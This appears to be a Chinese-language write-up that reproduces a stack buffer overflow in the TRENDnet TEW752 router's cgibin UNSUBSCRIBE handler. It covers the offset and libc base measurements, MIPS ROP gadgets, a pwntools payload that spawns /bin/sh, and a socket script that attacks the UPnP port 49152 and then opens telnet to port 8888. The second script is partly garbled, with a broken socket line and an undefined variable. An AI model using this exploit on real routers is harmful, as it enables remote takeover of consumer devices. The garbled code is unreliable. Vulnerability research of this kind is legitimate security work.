前期准备

固件下载链接：TEW752

静态分析

根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析

函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。

但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现

同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件

分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：

并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：

考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。

  • 模拟路由器环境

  • 构造HTTP请求（溢出HTTP_SID/SERVICE）

  • TCP scoket来发送请求

路由器模拟

使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。

动态调试

1 测偏移

先用cyclic 2000 > test生成测试字符到test文件，再用如下脚本启动qemu用户模式

#!/bin/bash

service="?service=`cat test`"

qemu-mipsel-static -L ./ -g 1234 -0 "gena.cgi" -E REQUEST_METHOD="UNSUBSCRIBE" -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR="192.168.182.14" ./htdocs/cgibin

使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474

2 找基址

由于使用vmmap命令无法得到libc的基址

所以，这里仍然根据延迟绑定机制来计算libc的基址

0x3ff8a060 - 0x52060 = 0x3ff38000

所以vmmap查看得到的，< explored >文件就是libc的基址

3 找gadget

考虑利用system函数来得到shell

mipsrop.stackfinder()

选择0x16824处的gadget

$sp + 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd

跳转$s0。

仍然需要防止坏字符00，所以找对$s0操作的gadget

观察溢出函数处

mipsrop.find("addiu $s0")

$s1放上一个gadget

$0 放system地址

$ra 返回地址放第二个gadget

本地利用

根据测得的偏移和找到的基址以及gadget，编写exp如下：

# python3
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x3ff38000
system_addr_1 = 0x53200-1
gadget1 =  0x16824
gadget2 = 0x32a98
padding = b'A' * 0x1ce
padding += p32(base_addr + system_addr_1) # s0
padding += p32(base_addr + gadget1 )      # s1
padding +=b'a'*4                           # s2
padding += p32(base_addr + gadget2)       # ra
padding += b'B' * 0x10
padding += b'/bin//sh'
  
f = open("exploit",'wb+')
f.write(padding)
f.close()

用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell

模拟环境利用

首先使用固件模拟工具FirmAE进行固件的模拟

然后直接运行以下exp：

import socket
import os
from time import sleep
server = '192.168.10.1'
port = 49152

socket.SOCK_STREAM)
request = "SUBSCRIBE /gena.cgi?service=" + str(shell) + " HTTP/1.0\n"
request += "Host: " + str(server) + str(port) + "\n"
request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"

request += "Timeout: Second-1800\n"
request += "Accept-Encoding: gzip, deflate\n"
request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
sleep(1)
con.connect((socket.gethostbyname(server),port))
con.send(request.encode())
results = con.recv(4096)

os.system('telnet ' + str(server) + ' 8888')
